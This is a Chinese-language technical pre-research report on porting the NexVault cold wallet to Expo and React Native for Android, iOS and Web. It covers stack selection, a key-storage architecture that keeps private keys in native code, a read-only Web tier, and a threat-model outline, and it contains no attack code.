# NexVault RN/Web 跨端移植预研报告

> 日期：2026-10-14 ｜ 状态：预研完成 ｜ 配套文件：AGENTS.md / specs/ / plans/ / doc/dependencies.md

## 目录

- [第1章 摘要与核心结论](#第1章-摘要与核心结论)
  - [1.1 项目背景与目标](#11-项目背景与目标)
  - [1.2 核心结论一览表](#12-核心结论一览表)
  - [1.3 七大核心洞察](#13-七大核心洞察)
  - [1.4 三端信任分级与安全承诺总原则](#14-三端信任分级与安全承诺总原则)
  - [1.5 报告导读](#15-报告导读)
- [第2章 技术栈选型](#第2章-技术栈选型)
  - [2.1 运行时基座：Expo SDK 57 vs bare RN](#21-运行时基座expo-sdk-57-vs-bare-rn)
  - [2.2 六项原生能力逐项验证](#22-六项原生能力逐项验证)
  - [2.3 数据层 / 路由 / UI](#23-数据层--路由--ui)
  - [2.4 Monorepo：pnpm workspace vs 单工程](#24-monorepopnpm-workspace-vs-单工程)
  - [2.5 Web3 层：viem 2.56.x vs ethers v6](#25-web3-层viem-256x-vs-ethers-v6)
- [第3章 密钥安全架构](#第3章-密钥安全架构)
  - [3.1 三端信任分级总表与红线](#31-三端信任分级总表与红线)
  - [3.2 Android：Keystore 包裹定案](#32-androidkeystore-包裹定案)
  - [3.3 iOS：expo-secure-store 定案](#33-iosexpo-secure-store-定案)
  - [3.4 Web 降级定案：只读观察钱包 + WalletConnect 桥接](#34-web-降级定案只读观察钱包--walletconnect-桥接)
  - [3.5 native 闭环：expo local module 四方法](#35-native-闭环expo-local-module-四方法)
  - [3.6 内存安全清单](#36-内存安全清单)
  - [3.7 威胁案例防御论证：「重打包 + 私钥明文处加一行上报 C&C」为何逐层失效](#37-威胁案例防御论证重打包--私钥明文处加一行上报-cc为何逐层失效)
  - [3.8 设备证明双轨：Play Integrity 主 + TEE Key Attestation 降级](#38-设备证明双轨play-integrity-主--tee-key-attestation-降级)
  - [3.9 分级处置决策表](#39-分级处置决策表)
- [第4章 防篡改与反逆向](#第4章-防篡改与反逆向)
  - [4.1 前提：Hermes 字节码等于明文，关键逻辑必须 native 化](#41-前提hermes-字节码等于明文关键逻辑必须-native-化)
  - [4.2 MVP 六项逐项](#42-mvp-六项逐项)
  - [4.3 Roadmap 方案要点](#43-roadmap-方案要点)
  - [4.4 平台层：Android Developer Verification 的定位边界](#44-平台层android-developer-verification-的定位边界)
  - [4.5 网络层 MVP：TLS pinning 边界与请求防重放](#45-网络层-mvptls-pinning-边界与请求防重放)
  - [4.6 性能红线：检测不进热路径](#46-性能红线检测不进热路径)
  - [4.7 攻击-防御映射素材表（供第 6 章汇总）](#47-攻击-防御映射素材表供第-6-章汇总)
- [第5章 热更新与工程化](#第5章-热更新与工程化)
  - [5.1 决策论证：EAS Update 托管 vs 自建](#51-决策论证eas-update-托管-vs-自建)
  - [5.2 EAS Update 落地清单](#52-eas-update-落地清单)
  - [5.3 热更禁区判定规则](#53-热更禁区判定规则)
  - [5.4 成本表](#54-成本表)
  - [5.5 构建层：EAS Build 定案与 Fastlane roadmap](#55-构建层eas-build-定案与-fastlane-roadmap)
  - [5.6 三端 CI/CD 最小流水线](#56-三端-cicd-最小流水线)
  - [5.7 供应链红线：钱包级依赖准入门禁](#57-供应链红线钱包级依赖准入门禁)
- [第6章 威胁模型与攻击-防御映射](#第6章-威胁模型与攻击-防御映射)
  - [6.1 范围与资产定义](#61-范围与资产定义)
  - [6.2 攻击-防御映射总表](#62-攻击-防御映射总表)
  - [6.3 威胁案例深度论证：「重打包 + 明文上报 C&C」木马的完整攻击链推演](#63-威胁案例深度论证重打包--明文上报-cc木马的完整攻击链推演)
  - [6.4 安全承诺分级总表](#64-安全承诺分级总表)
  - [6.5 分级处置策略的对抗论证](#65-分级处置策略的对抗论证)
  - [6.6 合规注记](#66-合规注记)
- [第7章 3天工期计划总览与风险](#第7章-3天工期计划总览与风险)
  - [7.1 排期总览](#71-排期总览)
  - [7.2 每日验收门槛](#72-每日验收门槛)
  - [7.3 demo 级 vs 真实防护级标注表](#73-demo-级-vs-真实防护级标注表)
  - [7.4 风险预案矩阵](#74-风险预案矩阵)
  - [7.5 工期可行性论证](#75-工期可行性论证)
- [第8章 合规边界与标准对标](#第8章-合规边界与标准对标)
  - [8.1 PCI-DSS 适用范围论证](#81-pci-dss-适用范围论证)
  - [8.2 扩展场景分析：加密卡发卡与法币 on-ramp 的 PCI 边界](#82-扩展场景分析加密卡发卡与法币-on-ramp-的-pci-边界)
  - [8.3 OWASP MASVS 自评：术语与目标级别](#83-owasp-masvs-自评术语与目标级别)
  - [8.4 MASVS 逐组自评表](#84-masvs-逐组自评表)
  - [8.5 小结：合规边界一页结论](#85-小结合规边界一页结论)

## 第1章 摘要与核心结论

> 安全承诺三级标注约定（贯穿全报告）：**[P] 已实现防护**（有密码学、硬件或系统强制语义）/ **[C] 仅提高攻击成本**（可被足够耐心的高权限攻击者绕过）/ **[S] 占位接口**（接口存在、实质防护未落地）。所有版本号、日期、价格均以 2026-10-14 当日一手来源核实为准。

### 1.1 项目背景与目标

NexVault 是一款 Kotlin 原生 Android 冷钱包，本报告论证其在 **3 个工作日**内以 Expo SDK 57 + React Native for Web 重构为 Android / iOS / Web 三端求职演示原型的可行性，对标「银行级安全」岗位 JD 的能力叙事：不是把安全写成口号，而是用可核实的架构红线（私钥不出 native、Web 永不持私钥）、可证伪的威胁模型和诚实的 [P]/[C]/[S] 能力分级来展示安全工程素养。产品面向海外用户，不面向中国大陆分发，合规上按 geo-fence + 隐私政策披露处理；Android 官网 APK 直链分发须在 2027 年全球生效前完成 Android Developer Console 注册[^1^]。

### 1.2 核心结论一览表

| # | 决策项 | 定案 | 依据章节 |
|---|---|---|---|
| 1 | 运行时基座 | **Expo SDK ≥ 57.0.21 + CNG + Development Build**（锁 57.0.21 修复 Hermes v1 回归；Expo Go 仅限原型；SDK 58 beta 不碰）[^2^][^3^] | 第 2 章 2.1 |
| 2 | 路由 | **Expo Router 57**（版本随 SDK 对齐；TanStack Router 官方无 RN 适配器，排除）[^4^] | 第 2 章 2.3.2 |
| 3 | 状态层 | **TanStack Query 5.104（服务端态）+ Zustand 5.0（客户端态）**；私钥/助记词永不入 store | 第 2 章 2.3.1 |
| 4 | UI 库 | **NativeWind v4 稳定线**（v5 RC 钉住带 CVE-2026-97724 的 worklets 0.10.1，「最新 ≠ 最安全」）；Tamagui v3 备选，gluestack 排除[^5^] | 第 2 章 2.3.3 |
| 5 | Web3 层 | **viem 2.56.x（pin）**；「构造→序列化→keccak256→native 签名→广播」为一等 API；web3.js 已归档禁用[^6^] | 第 2 章 2.5 |
| 6 | 工程结构 | **pnpm workspace monorepo**：apps/mobile（唯一 Expo app，三端同构）+ packages/vault-core（纯 TS 密码学核心）；pnpm 问题超 2 小时降级单工程 | 第 2 章 2.4 |
| 7 | 密钥存储 | **「AES-256-GCM wrap key 存 Keystore/Keychain + 生物识别绑定」包裹 secp256k1 私钥**（Keystore/StrongBox/Secure Enclave 均不支持 k1 曲线，包裹是唯一通用路径）[P]（硬件门禁层）[^7^] | 第 3 章 3.2/3.3 |
| 8 | Web 端定位 | **只读观察钱包 + WalletConnect（Reown）桥接回手机签名**；Web bundle 结构上不含任何私钥路径 [P]（架构层） | 第 3 章 3.4 |
| 9 | native 闭环 | **expo local module 四方法**：importMnemonic / deriveAddress / signDigest / destroy；JS↔native 仅传 ArrayBuffer + opaque handle [P] | 第 3 章 3.5 |
| 10 | 设备证明 | **Play Integrity 为主轨**（app/设备完整性 verdict，服务端验 JWT）**+ TEE Key Attestation 降级**（密钥硬件归属绑定、无 GMS 设备路径）[^8^] | 第 3 章 3.8 |
| 11 | 热更新/构建 | **EAS Update（端到端代码签名，锁 Production 档）+ EAS Build**；自建备选 xprem，签名不受档位限制、仅改 updates.url 可回退[^3^][^9^] | 第 5 章 5.1/5.5 |
| 12 | 成本基线 | EAS 月成本：**1K MAU = $0 / 10K ≈ $54 / 100K ≈ $449**；代码签名红线反推 Production $199/月为安全入场费[^3^] | 第 5 章 5.4 |

### 1.3 七大核心洞察

**Insight 1：单一架构原则同时击穿两大风险面。**「私钥不出 native + Web 不持私钥」一条原则，同时消解 ① Hermes 字节码=明文（hermes-decomp 实证可反编译出结构化可读 JS）下的 JS 层窃密面，和 ② Web 供应链投毒面（chalk-debug 地址劫持、Shai-Hulud、Trust Wallet 扩展事件）[^10^]。推论：架构红线比任何单点检测值钱，三端信任分级应作为产品级决策写入 AGENTS.md。*依据维度：dim04/06/07/08/09/10/12；置信度：high。*

**Insight 2：安全红线直接决定商业成本下限。** EAS Update 代码签名（冷钱包 OTA 硬红线）锁定 Production 档 $199/月——不是「要不要付费」，而是安全需求反推档位；等价替代为 xprem 自建（代码签名不受档位限制，仅改 updates.url）[^3^][^9^]。成本表必须把签名红线作为约束条件而非可选项。*依据维度：dim11（+dim09）；置信度：high。*

**Insight 3：平台验证新规与本地签名校验互补而非替代。** Android Developer Verification（2026-09-30 巴西/印尼/新加坡/泰国生效、2027 全球）只做开发者身份归因、不审包内容：挡得住匿名攻击者批量分发，挡不住已注册开发者包被重打包，本地 native 签名校验仍是端上唯一兜底[^1^]。*依据维度：dim09/12 + 官方来源；置信度：high。*

**Insight 4：3 天工期关键路径在 native 闭环，不在 UI。** 六项原生能力中四项（Keystore KV、FLAG_SECURE、manifest/Application、签名读取）有成熟路径当日可落，两项（NDK C++ 化、Secure Enclave 通用封装）必须进 roadmap；UI 层（NativeWind v4 + Expo Router + FlashList）全是成熟件。Day 1 应以 vault-core 四方法为最高优先级，native 封装卡顿超半天即触发降级（JS noble/curves 仅联调占位、真钱路径禁用）。*依据维度：dim02/03/07；置信度：high。*

**Insight 5：端上检测层的诚实定位是「攻击成本定价器」。** 除「检测信号与密钥派生 fail-closed 耦合」（唯一 [P]）外，Root/Frida/反调试/签名校验在 root 设备上均可被足够耐心的攻击者绕过，一律 [C]。禁止把检测层写成「防护」——与 OWASP MASVS-R 同口径，这本身是面试展示安全专业度的加分项[^11^]。*依据维度：dim08/09；置信度：high。*

**Insight 6：「最新 ≠ 最安全」的选型纪律可量化执行。** NativeWind v5 RC 钉住带 CVE 的 worklets、wallet-core 有 CVE-2025-66692、react-native-keychain 停滞 6 个月+、web3.js 已归档——每个反例对应一条可执行检查规则（近 6 个月提交、CVE 清单、dependents 数、仿冒包名核对），固化为 specs/tech-stack.md 依赖准入门禁与 CI 检查。*依据维度：dim03/04/06/07/12；置信度：high。*

**Insight 7：双轨设备证明的风险分级语义。** Play Integrity（有频限、证 app/设备）与 Key Attestation（无频限、证密钥硬件归属、可脱 GMS）防的是不同层：注册/首签高价值操作走 Classic + attestation 双验，日常检测用 Standard + 缓存，无 GMS 设备 attestation-only + 风险标记，模拟器仅 debug。该矩阵同时满足「Play Integrity 为主」的设定与工程现实[^8^]。*依据维度：dim05/08；置信度：high。*

### 1.4 三端信任分级与安全承诺总原则

三端不是同一份密钥能力的复制，而是按平台信任面做的能力分级裁剪：

- **Android（全功能）**：Keystore/StrongBox 硬件包裹 + per-use 生物识别 + Play Integrity/Key Attestation 双轨——[P] 级在硬件门禁层。
- **iOS（全功能）**：Keychain 生物识别 ACL（Secure Enclave 硬件强制门禁）+ App Attest——[P] 级在门禁层。
- **Web（只读）**：仅地址/xpub、余额、交易历史、构造未签名交易，签名经 WalletConnect 桥回手机。Web 无 attestation 能力、无法应用层 pinning、供应链投毒实证充分，故 bundle 从依赖裁剪与构建期 lint 两个层面结构上不含私钥路径——「无钥可偷」是唯一的 [P] 级 Web 结论。

两条红线贯穿全书：**① 私钥不出 native**——k1 私钥、seed、链码明文只存在于原生层内存，驻留不超过单次签名调用，Hermes 字节码按明文对待；**② Web 永不持私钥**——不仅是「不调用」，而是构建产物中不存在导入/解密/签名符号。端上检测层的诚实定位是 [C]：在已 root/越狱设备上，攻击者与本进程同级甚至更高权限，任何客户端检测最终可绕过（RootBeer 官方自述「no root detection code can ever be 100% effective」）；全系统**唯一 [P] 级端上控制是「检测信号与密钥派生 fail-closed 耦合」**——检测不通过则 native 层根本不派生、不释放签名材料，伪造「未 root」返回值也无法凭空造出密钥。「重打包后上报私钥」木马失效的本质是这两条红线 + 签名/attestation 验真，而非检测层（第 3.7、6.3 节完整推演）。

### 1.5 报告导读

- **第 2 章 技术栈选型**：Expo SDK 57 基线核实、六项原生能力逐项验证、数据/路由/UI/monorepo/Web3 层定案与降级预案。
- **第 3 章 密钥安全架构**：三端信任分级总表、Android Keystore 包裹与 iOS Keychain 分层定案、Web 只读降级、native 四方法闭环、设备证明双轨与分级处置。
- **第 4 章 防篡改与反逆向**：以「Hermes 字节码=明文」为前提的 MVP 六项检测逐项方案、[C] 级诚实定位、roadmap 加固（o-mvll、VMP）与 TLS pinning 边界。
- **第 5 章 热更新与工程化**：EAS Update 托管 vs 自建裁决、签名/回滚/灰度落地清单、三档 MAU 成本表、EAS Build 与供应链红线门禁。
- **第 6 章 威胁模型与攻击-防御映射**：资产分级、攻击链逐步推演与逐层失效点、残余风险披露、安全承诺分级总表与合规注记。

配套交付物：`nexvault-rn-sdd/specs/`（vault-core、security-android、security-ios 三份规格，即「宪法」级约束）、`nexvault-rn-sdd/plans/3-day-implementation-plan.md`（三天排期）、`nexvault-rn-sdd/AGENTS.md`（红线与依赖准入门禁，供 AI agent 与人类开发者共同遵守）。

## 第2章 技术栈选型

本章给出 NexVault 从 Kotlin Android 单端工程移植为「Expo + React Native for Web（下文简称 RN Web）」三端工程的全栈选型结论。所有版本号、日期、价格均以 2026-10-14 当日可核实的官方文档、官方 changelog、npm registry 或 GitHub 一手页面为准；涉及安全能力的承诺统一采用三级标注：**[P] 已实现防护 / [C] 仅提高攻击成本 / [S] 占位接口**。

---

### 2.1 运行时基座：Expo SDK 57 vs bare RN

#### 2.1.1 版本基线核实

截至 2026-10-14，Expo 最新稳定版为 **SDK 57**（2026-06-30 发布），对应 React Native 0.86（补丁线 0.86.3）、React 19.2.3、react-native-web ~0.21[^2^][^12^]。需要修正两个常见误解：其一，Hermes v1 并非 SDK 57 才默认，而是自 SDK 56（RN 0.85，2026-05-21）起即为默认引擎[^13^]；其二，SDK 56 及早期 SDK 57 存在 Hermes v1 与 reanimated/worklets 组合下内存暴涨 25–30% 的已知回归，官方在 changelog 中明确要求 SDK 57 用户升级至 **expo ≥ 57.0.21**[^14^]。SDK 58 于 2026-09-15 进入 beta（搭载 RN 0.88 RC），stable 需待 RN 0.88 发布之后，3 天原型不应触碰 beta 通道[^15^]。

#### 2.1.2 路线对比

Expo 官方已于 2026-09 明确表态：「managed vs bare / eject」这组概念对新建 Expo 项目已经过时，所有新项目默认走 **CNG（Continuous Native Generation，持续原生生成）**——android/ios 目录由 `npx expo prebuild` 从 app.json + config plugin 反复重建，自定义原生代码以本地 Expo Module 表达，「eject」作为一次性不可逆操作的概念随之废弃[^16^][^17^]。SDK 57 起 `expo prebuild` 默认清空重建原生目录，手改原生文件需 `--no-clean`，这是 CNG 对重度手改原生团队的主要摩擦点[^2^]。2026 年社区共识与官方立场一致：新项目默认 Expo + CNG，bare RN 仅剩三类狭窄但真实的场景——brownfield 嵌入既有原生 App、on-prem CI 强制要求、config plugin 无法表达的极特殊原生 SDK[^18^]。

| 维度 | Expo SDK 57（CNG + Development Build） | bare RN | 本项目胜方 |
|---|---|---|---|
| 起步速度（3 天工期） | `create-expo-app` 分钟级起步；`npx expo run:android` 本地构建免费 | 环境搭建与原生配置可消耗 0.5–1 天 | Expo |
| 原生自由度 | config plugin + 本地 Expo Module（SDK 56 起支持工程内内联 Kotlin/Swift 模块）；可随时 prebuild 落地 | 第一天起完全自由 | 平手（逃逸舱充足） |
| 升级成本 | `npx expo install --fix` + `prebuild --clean`；版本对齐由官方担保 | Upgrade Helper 手工 diff Podfile/Gradle | Expo |
| Web 支持 | Metro web 一等支持 + expo-router 三端统一路由 + 静态导出 | 自行配置 RN Web 别名、打包器与路由分叉 | Expo |
| OTA | EAS Update 内置；SDK 56 起 Hermes bytecode diffing 默认开启（官方实测平均减量 58%，beta 期最高 75%）[^13^] | 需手工集成 expo-updates 或第三方 | Expo |
| 团队技能匹配 | 开发者 5 年 Android NDK 经验可直接转化为本地 Kotlin 模块（高杠杆）；iOS 弱项由 CNG/EAS 兜底 | 要求双端原生工程能力均衡 | Expo |
| 成本 | EAS Build Free 档每月 15 次 Android + 15 次 iOS 构建、OTA 1,000 MAU；本地构建永远免费[^3^] | 无平台费用 | 平手 |
| 冷钱包安全适配 | Keystore/Keychain 封装模块现成；OTA 可禁用或启用端到端代码签名（代码签名为 Production 档 $199/月能力，客户端本地验签）[^3^][^19^] | 同等能力全手工 | 平手 |
| 供应商绑定 | prebuild 可逆，退出成本低；EAS 云可完全不用 | 无绑定 | bare（轻微） |

**分析（约 180 字）**：八项维度中 Expo 胜出五项、平手两项、bare 仅在一项（绑定）上微弱占优，且该项被 prebuild 可逆性对冲。对本项目的决定性变量是工期与技能结构：bare RN 的手工双端原生工程维护恰好压在团队最弱的 iOS 侧，而 Expo 的短板（自定义原生代码需走模块抽象）恰好被开发者 5 年 Android NDK 经验覆盖——本地 Expo Module 对 Kotlin 工程师几乎零学习成本。OTA 侧 bytecode diffing 默认开启使 JS 热更带宽成本下降 58% 以上，但冷钱包场景须注意代码签名是付费档能力，演示叙事中应将其作为「安全需求反推商业档位」的约束呈现，而非可选项。

#### 2.1.3 Expo Go 边界

Expo Go 已被官方重新定位为学习/原型工具：SDK 57 changelog 明确「生产应用不推荐以 Expo Go 为开发环境」[^2^]；SDK 56 起 Expo Go 不再上架 App Store / Google Play，且 2026-09-03 起 iOS 版强制登录[^13^]。对本项目更硬的边界是：expo-secure-store 的生物识别能力在 Expo Go 中不可用，自写本地模块也无法装入 Expo Go——因此 Expo Go 仅用于 Day 1 上午的纯 UI 走查，引入任何安全相关原生能力前必须切换到 **Development Build**（expo-dev-client）[^20^]。

> **定案（2.1）**：基座锁定 **Expo SDK ≥ 57.0.21（expo ~57.0.23+）+ CNG + Development Build**；配套 `react-native@0.86.3`、`react@19.2.3`、`react-native-web@~0.21`，Node ≥ 22.13。不选 bare RN；Expo Go 仅限首日 UI 原型；不追 SDK 58 beta；「eject」概念已废弃，原生定制一律走 config plugin + 本地 Expo Module。3 天演示用 EAS Build Free 档 + 本地构建即可，OTA 代码签名（Production 档 $199/月）列入发布期决策。

---

### 2.2 六项原生能力逐项验证

验证方法：每项能力先查 Expo 官方模块是否覆盖，再查社区库维护状态，最后评估自写本地 Expo Module（`npx create-expo-module --local`，Kotlin/Swift）的工程量；工期判定以「3 天内能否在真机验证」为铁律，不可验证项一律进 roadmap。

| # | 能力 | 实现路径 | 成熟度证据 | 3 天可行性 |
|---|---|---|---|---|
| ① | Android Keystore / TEE | 小秘密存储：官方 expo-secure-store（Android 端 = Keystore 加密密钥包裹 AES 后落 SharedPreferences，单值上限约 2048 字节，Web 不支持）[^21^]；密钥生成/签名/Key Attestation 等 Keystore 直操：**SecureStore 是 KV 封装、不提供此类 API，需自写本地模块**（Kotlin `KeyGenParameterSpec`，0.5–1 天）[^22^] | 官方模块稳定；自写路径官方文档完备[^23^] | ✅ 可完成（[P] 硬件级密钥保护，TEE vs StrongBox 级别须自写 attestation 验证） |
| ② | NDK C++ 模块 | 本地模块的 `android/build.gradle` 内嵌 `externalNativeBuild { cmake }`（CMake 3.22.1 + NDK r25+，已有 ffmpeg-expo 等 SDK≥56 先例）；或 Nitro Modules（JSI + Swift↔C++ 近零开销互操作）；或 RN 官方纯 C++ TurboModule[^24^][^25^][^26^] | 三条路径均有文档与先例，但逻辑迁移量超工期 | 📋 **Roadmap**（3 天内仅验证 CMake 骨架编译跑通，不迁移密码学逻辑；理由：C++ 化是长期抗逆向需求而非原型闭环依赖，联调/真机边界行为验证不可压缩进剩余工期） |
| ③ | FLAG_SECURE 防截屏 | 官方 expo-screen-capture：`preventScreenCaptureAsync(key)`（Android 等效 FLAG_SECURE，含最近任务页保护；iOS 阻止截图/录屏并提供 app switcher 毛玻璃）[^27^] | 官方模块、文档完善；已知 bug：iOS 上不同 key 重复调用会整屏变黑（expo/expo#48985，2026-08），须同一 key 幂等调用规避[^28^] | ✅ 可完成（半天以内；[C] 级：root 设备可 hook 绕过） |
| ④ | 自定义 Application 类 / AndroidManifest | 无需手改原生目录。config plugin 三件套：`withAndroidManifest`（改 `<application android:name>`）、`withMainApplication`（改生成的 MainApplication.kt）、`withDangerousMod`（拷贝新增 .kt 文件）[^29^] | 官方教程 + 大量生产先例 | ✅ 可完成（半天；[S]/[C] 级，视注入逻辑而定） |
| ⑤ | 读取应用签名证书 | **无现成库**：react-native-device-info 的 `getFingerprint()` 返回的是 Build.FINGERPRINT（如 `google/walleye/...:user/release-keys`），与签名证书无关，其全量 API 表无签名项[^30^]。自写本地模块：`PackageManager.getPackageInfo(pkg, GET_SIGNING_CERTIFICATES)` → `signingInfo.apkContentsSigners[0]` → SHA-256 → hex，约 30 行 Kotlin，半天 | 自写路径成熟 | ✅ 可完成（半天；[C] 级：root 设备上 PackageManager 可被 hook，须与 native 侧常量比对 + 服务端 attestation 组合） |
| ⑥ | iOS Secure Enclave | 官方 @expo/app-integrity 将 App Attest 私钥存入 Secure Enclave，但**仅限 attestation 用途且仍为 alpha（频繁 breaking change）**[^31^]；通用密钥操作无官方模块，社区 react-native-secure-sign 支持 Expo dev-client 但体量小、未大规模验证[^32^]；自写 Swift `SecKeyCreateRandomKey(kSecAttrTokenIDSecureEnclave)` 受团队 iOS 能力约束 | 无官方通用模块 | ⚠️ **降级 + Roadmap**：iOS 端 3 天内以 expo-secure-store（Keychain 兜底）降级存储，App Attest 仅做连通性演示；完整 Secure Enclave 密钥体系进 roadmap（理由：团队 iOS 仅基础 Swift，alpha 库 + 自写 Enclave 模块的真机验证无法压缩进 3 天） |

**分析（约 200 字）**：六项能力呈「4 项当日可落、2 项必须 roadmap」的分布，与第 1 章工期关键路径判断一致——3 天闭环的瓶颈在 native 签名链路而非 UI。需要强调 expo-secure-store 的能力边界：它是 KV 存储封装而非 Keystore 通用接口，密钥派生、签名、Key Attestation 均须自写本地模块，且 SecureStore 不暴露密钥的硬件背书级别（TEE 还是 StrongBox），威胁模型要求硬件绑定时必须在自写模块内自验 attestation。能力⑤的签名校验与能力③的防截屏同属 [C] 级「攻击成本定价器」：在 root 设备上均可被足够耐心的攻击者绕过，其价值在于把重打包攻击从「脚本化」抬升到「逐函数手工 patch」，报告中禁止表述为「防护」。能力②⑥进 roadmap 的共同理由是验证成本不可压缩，而非路径不存在——三条 C++ 路径与社区 Enclave 库均有生产先例，排入 v2 迭代即可。

> **定案（2.2）**：Day 1 最高优先级为 vault-core 本地 Expo Module（Kotlin 四方法：`importMnemonic / deriveAddress / signDigest / destroy`，JS↔native 仅传 ArrayBuffer + opaque handle）；③④⑤同日并行落地；①中 SecureStore 即时可用、Keystore 直操模块 ≤1 天；②⑥进 roadmap 并在报告中如实标注降级方案。任何 native 封装卡顿超半天即触发降级预案（见 2.5 节 @noble/curves 联调占位路径）。

---

### 2.3 数据层 / 路由 / UI

#### 2.3.1 数据层：TanStack Query 5.104 + Zustand 5.0

职责切分采用 2026 年社区共识：服务端状态（余额、行情、链上数据）归 TanStack Query，客户端状态（UI 态、会话态）归 Zustand。TanStack Query 官方文档明确兼容 React Native[^33^]，npm registry 实测 latest 为 **5.104.2（2026-10-11 发布）**[^6^]；RN 下按官方指南配置 AppState focusManager 与 `@tanstack/query-async-storage-persister`，敏感数据不落盘、仅缓存非敏感行情数据。Zustand 实测 latest **5.0.15（2026-08-13）**，gzip 约 1.1KB（Redux Toolkit 约 11–12KB），一个 `create()` 即可上手，Snyk 漏洞库无已知直接漏洞[^6^][^34^]。纯 JS 状态库不受新架构影响。排除项：Redux Toolkit（3 天原型过度设计）、MobX（2026 年已边缘化）、Jotai（本场景无大量派生态需求）。**架构红线：私钥/助记词永不进入任何 store。**

#### 2.3.2 路由：Expo Router 57（TanStack Router 排除）

TanStack Router 官方安装文档直述：「TanStack Router is currently only compatible with React (with ReactDOM) and Solid」，RN 适配器不存在、待社区贡献[^35^]——这不是「实验性支持」，是「不支持」，三端方案直接不成立，**排除**。Expo Router 是 Expo 官方唯一推荐路由，自 SDK 55 起版本号与 SDK 对齐（**expo-router ~57.x**，实测 latest 57.0.26，2026-10-12），社区流传的「Expo Router v7」说法已过时[^6^][^4^]。SDK 56 起 Expo Router 已与 React Navigation 解耦，应用代码禁止直接从 `@react-navigation/*` 导入（官方提供 codemod）[^4^]。SDK 57 下 Web 端走静态导出（`web.output: "static"`）最稳；SSR/streaming 在 57 仍是 `unstable_` 实验旗标，演示不踩[^15^]。

#### 2.3.3 UI 库：NativeWind v4 定案，Tamagui 备选，gluestack 排除

| 维度 | NativeWind v4 ✅ | Tamagui v3（备选） | gluestack-ui v5（排除） |
|---|---|---|---|
| 当前版本/状态 | 4.2.7 稳定（2026-09-14）；v5 仅 5.0.0-rc.0，官方自述「V4 remains the stable release」[^6^][^5^] | 3.0.9，调研当日仍有提交，日更级活跃[^36^] | 5.0.15（2026-06-25 后近 4 个月无新版）[^6^] |
| Web 支持 | ✅ className 直通 RN Web，输出标准 Tailwind CSS | ✅ 最强（编译器提取真 CSS） | ❌ **v5 官方宣布废弃 Next.js/Web 适配，战略转向纯 native**[^37^] |
| 性能模型 | 编译期（Metro 转换），运行时开销约 2ms 可忽略 | 编译期 + v3 原生样式引擎 | 构建于 NativeWind v5 之上 |
| 学习曲线（RN 初级 + 3 天） | 最低（会 Tailwind 即可） | 中高（tokens/编译器概念多） | 低-中 |
| 组件完备度 | 仅样式层，组件需自建 | 80+ 组件全套 | 30+ 组件 |
| 安全记录 | 自身无 CVE；**v5 RC 钉住 react-native-worklets 0.10.1，低于 CVE-2026-97724 修复版 0.12.2（原型链污染→远程 DoS）**[^38^] | CVE-2026-15702（原型链污染，≤2.3.0）已于 2.3.1 修复，v3 不受影响[^39^] | **2026-06-06 供应链投毒事件**：@react-native-aria 17/20 包 + @gluestack-ui/utils 被植入混淆 RAT[^40^] |
| 结论 | **定案** | 强备选（v2 迭代迁移候选） | **排除** |

**分析（约 190 字）**：gluestack 的排除是双重硬理由而非偏好：v5 放弃 Web 与三端目标直接冲突，且 2026-06 的 RAT 投毒事件对金融场景构成不可接受的信任成本。NativeWind v4 与 Tamagui v3 之间是「3 天确定性」与「长期设计系统能力」的权衡：Tamagui 在性能与 Web 保真上技术上更优、CVE-2026-15702 已修复、维护极活跃，但其 tokens/编译器配置在 RN 初级开发者 + 3 天约束下风险过高，且 NativeWind 的 className 回退成本几乎为零。v5 RC 钉住带 CVE 的 worklets 0.10.1 是「最新 ≠ 最安全」原则的教科书反例——原型期锁定 v4 稳定线，待 v5 转正且依赖链修复后再评估迁移。

#### 2.3.4 性能基线

动画与手势：**Reanimated 4**（UI 线程 worklet，实测 latest 4.7.1，2026-10-02）+ Gesture Handler，是 60/120fps 目标的唯一正解；安全基线硬性要求 **react-native-worklets ≥ 0.12.2**（当前 0.13.0）以规避 CVE-2026-97724[^6^][^38^][^41^]。长列表：**FlashList v2**（实测 2.3.3，2026-10-01），新架构重写、免 estimatedItemSize、Shopify 生产验证，覆盖交易记录/地址簿场景；FlatList 仅用于 <200 行静态设置页；FlashList 遇白闪问题时升级项为 LegendList（同为新架构-only，SDK 57 天然满足）[^6^][^42^]。

> **定案（2.3）**：`@tanstack/react-query@^5.104` + `zustand@^5.0`（persist + MMKV，私钥永不进 store）；路由 `expo-router@~57`（Typed Routes 开启，Web 静态导出）；UI `nativewind@^4.2` 稳定线 + 自建小组件，Tamagui v3 列 v2 候选，gluestack 与 NativeWind v5 RC 禁用；动画 Reanimated ~4.7 + worklets ≥0.12.2；列表 FlashList ^2.3。

---

### 2.4 Monorepo：pnpm workspace vs 单工程

Expo 官方对 Bun/npm/pnpm/Yarn workspace 均为 first-class 支持：SDK 52 起 `expo/metro-config` 自动完成 monorepo 配置（无需手写 watchFolders/nodeModulesPaths），SDK 54 起支持 pnpm 隔离安装（isolated dependencies），EAS Build 有 monorepo 专章[^43^]。已知坑：pnpm hoisted 模式下其他 app 的 expo 原生依赖会被 autolinking 误扫进本 app，需 `autolinking.exclude` + Metro `resolveRequest` 双层屏蔽（SDK 55 实战记录）[^44^]。

| 维度 | pnpm workspace（apps/mobile + packages/vault-core） | 单 Expo 工程（src/core 内部目录） |
|---|---|---|
| 结构 | 唯一 Expo app 产三端 + 纯 TS 零原生依赖的密码学/业务核心包 | 全部代码在一个包内 |
| 官方支持 | 指南完整，SDK 52+/54+ 自动配置 | 零配置 |
| 3 天工期成本 | 约 1–2 小时（照官方指南）+ pnpm 隔离安装下个别老库可能需回退 `nodeLinker: hoisted` | 0 |
| 核心收益 | vault-core 独立成包利于安全审计、单测与多包演进；包边界强制「私钥逻辑与 UI 解耦」 | 无包边界约束 |
| 风险 | autolinking 误扫、React 双拷贝（须三端统一 react@19.2.3，双拷贝运行时必崩） | 后续拆包需迁移（Metro 自动配置使成本低） |

**分析（约 150 字）**：必须明确否决的方案是「三端拆三个 app」——一个 Expo app 通过 Metro 同时产出 Android/iOS/Web，`Platform.OS` + `.web.ts` 平台后缀即可覆盖分叉，拆 web 为独立 app 只会引入 React/RN 版本对齐成本，3 天内是纯负收益。pnpm workspace 相对单工程的增量成本仅 1–2 小时，换来的是冷钱包场景最值钱的资产：密码学核心的独立审计边界与可测试性。主要风险（autolinking 误扫、React 双拷贝）均有明确的官方/社区解法与可执行回退——若 Day 1 pnpm 解析问题超过 2 小时，降级为单工程 + `src/core`，日后再拆。

> **定案（2.4）**：采用 **pnpm workspace monorepo**：`apps/mobile`（唯一 Expo app，三端同构）+ `packages/vault-core`（纯 TS，零原生依赖）。降级预案：pnpm 问题超 2 小时 → 单工程 + 内部目录。

---

